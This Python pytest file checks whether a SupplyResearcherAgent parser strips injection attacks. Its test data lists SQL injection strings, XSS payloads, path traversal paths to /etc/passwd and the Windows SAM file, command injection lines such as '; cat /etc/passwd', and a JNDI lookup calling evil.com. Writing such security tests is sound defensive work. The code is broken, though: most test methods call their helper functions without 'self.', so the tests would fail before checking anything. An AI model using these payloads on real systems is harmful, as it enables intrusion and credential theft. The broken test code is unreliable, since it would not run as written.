"""
Security and validation tests for SupplyResearcherAgent
Modular design with ≤300 lines, ≤8 lines per function
"""

from netra_backend.tests.test_utils import setup_test_path
setup_test_path()

import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch

# Add project root to path

from netra_backend.app.agents.state import DeepAgentState
from netra_backend.tests.supply_researcher_fixtures import (

# Add project root to path
    agent, malicious_inputs, assert_malicious_input_safe
)


class TestSupplyResearcherSecurity:
    """Security and input validation tests"""

    def test_input_validation_security(self, agent):
        """Test input validation against injection attacks"""
        malicious_test_cases = _get_malicious_inputs()
        for malicious_input in malicious_test_cases:
            parsed = agent._parse_natural_language_request(malicious_input)
            _verify_safe_parsing(parsed)

    def _get_malicious_inputs(self):
        """Get malicious input test cases (≤8 lines)"""
        return [
            "'; DROP TABLE supply_items; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}"  # Template injection
        ]

    def _verify_safe_parsing(self, parsed):
        """Verify input was parsed safely (≤8 lines)"""
        assert_malicious_input_safe(parsed)

    async def test_rate_limiting_backoff(self, agent):
        """Test exponential backoff on rate limit errors"""
        state = _create_rate_limit_test_state()
        call_count = 0
        mock_api = _create_rate_limit_mock(call_count)
        await _test_rate_limiting_behavior(agent, state, mock_api)

    def _create_rate_limit_test_state(self):
        """Create state for rate limiting test (≤8 lines)"""
        return DeepAgentState(
            user_request="Test rate limiting",
            chat_thread_id="test_thread",
            user_id="test_user"
        )

    def _create_rate_limit_mock(self, call_count):
        """Create rate limit mock function (≤8 lines)"""
        async def mock_api_with_rate_limit(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise Exception("429 Too Many Requests")
            return _get_successful_response()
        return mock_api_with_rate_limit

    def _get_successful_response(self):
        """Get successful API response (≤8 lines)"""
        return {
            "session_id": "success",
            "status": "completed",
            "questions_answered": [],
            "citations": []
        }

    async def _test_rate_limiting_behavior(self, agent, state, mock_api):
        """Test rate limiting backoff behavior (≤8 lines)"""
        with patch.object(agent, '_call_deep_research_api', side_effect=mock_api):
            with patch('asyncio.sleep', new_callable=AsyncMock) as mock_sleep:
                await _execute_rate_limit_test(agent, state)
                _verify_backoff_delays(mock_sleep)

    async def _execute_rate_limit_test(self, agent, state):
        """Execute rate limiting test (≤8 lines)"""
        try:
            await agent.execute(state, "rate_limit_test", False)
        except Exception:
            pass  # Expected to fail after retries

    def _verify_backoff_delays(self, mock_sleep):
        """Verify exponential backoff delays (≤8 lines)"""
        if mock_sleep.called:
            delays = [call[0][0] for call in mock_sleep.call_args_list]
            for i in range(1, len(delays)):
                assert delays[i] >= delays[i-1]

    def test_sql_injection_prevention(self, agent):
        """Test prevention of SQL injection attacks"""
        sql_injections = _get_sql_injection_cases()
        for injection in sql_injections:
            parsed = agent._parse_natural_language_request(injection)
            _verify_sql_injection_blocked(parsed, injection)

    def _get_sql_injection_cases(self):
        """Get SQL injection test cases (≤8 lines)"""
        return [
            "1; DROP TABLE users; --",
            "'; UNION SELECT * FROM passwords; --",
            "1' OR '1'='1",
            "admin'--",
            "'; INSERT INTO admin VALUES('hacker'); --"
        ]

    def _verify_sql_injection_blocked(self, parsed, injection):
        """Verify SQL injection was blocked (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Ensure no SQL keywords were preserved
        assert "DROP" not in str(parsed).upper()
        assert "UNION" not in str(parsed).upper()

    def test_xss_prevention(self, agent):
        """Test prevention of XSS attacks"""
        xss_attacks = _get_xss_attack_cases()
        for attack in xss_attacks:
            parsed = agent._parse_natural_language_request(attack)
            _verify_xss_blocked(parsed)

    def _get_xss_attack_cases(self):
        """Get XSS attack test cases (≤8 lines)"""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<svg onload=alert('xss')>"
        ]

    def _verify_xss_blocked(self, parsed):
        """Verify XSS attack was blocked (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Ensure no script tags were preserved
        assert "<script>" not in str(parsed).lower()
        assert "javascript:" not in str(parsed).lower()

    def test_path_traversal_prevention(self, agent):
        """Test prevention of path traversal attacks"""
        path_attacks = _get_path_traversal_cases()
        for attack in path_attacks:
            parsed = agent._parse_natural_language_request(attack)
            _verify_path_traversal_blocked(parsed)

    def _get_path_traversal_cases(self):
        """Get path traversal test cases (≤8 lines)"""
        return [
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam"
        ]

    def _verify_path_traversal_blocked(self, parsed):
        """Verify path traversal was blocked (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Ensure no path traversal patterns were preserved
        assert "../" not in str(parsed)
        assert "..\\" not in str(parsed)

    def test_template_injection_prevention(self, agent):
        """Test prevention of template injection attacks"""
        template_attacks = _get_template_injection_cases()
        for attack in template_attacks:
            parsed = agent._parse_natural_language_request(attack)
            _verify_template_injection_blocked(parsed)

    def _get_template_injection_cases(self):
        """Get template injection test cases (≤8 lines)"""
        return [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "${jndi:ldap://evil.com/a}"
        ]

    def _verify_template_injection_blocked(self, parsed):
        """Verify template injection was blocked (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Ensure no template injection patterns were preserved
        assert "{{" not in str(parsed)
        assert "${" not in str(parsed)

    def test_command_injection_prevention(self, agent):
        """Test prevention of command injection attacks"""
        command_attacks = _get_command_injection_cases()
        for attack in command_attacks:
            parsed = agent._parse_natural_language_request(attack)
            _verify_command_injection_blocked(parsed)

    def _get_command_injection_cases(self):
        """Get command injection test cases (≤8 lines)"""
        return [
            "; cat /etc/passwd",
            "| whoami",
            "& net user",
            "`id`",
            "$(whoami)"
        ]

    def _verify_command_injection_blocked(self, parsed):
        """Verify command injection was blocked (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Ensure no command injection patterns were preserved
        assert "cat " not in str(parsed).lower()
        assert "whoami" not in str(parsed).lower()

    async def test_input_length_validation(self, agent):
        """Test validation of input length limits"""
        long_input = _create_extremely_long_input()
        parsed = agent._parse_natural_language_request(long_input)
        _verify_length_handled_safely(parsed)

    def _create_extremely_long_input(self):
        """Create extremely long input for testing (≤8 lines)"""
        return "A" * 10000  # 10KB of data

    def _verify_length_handled_safely(self, parsed):
        """Verify long input was handled safely (≤8 lines)"""
        assert isinstance(parsed, dict)
        assert "research_type" in parsed
        # Should not crash or cause memory issues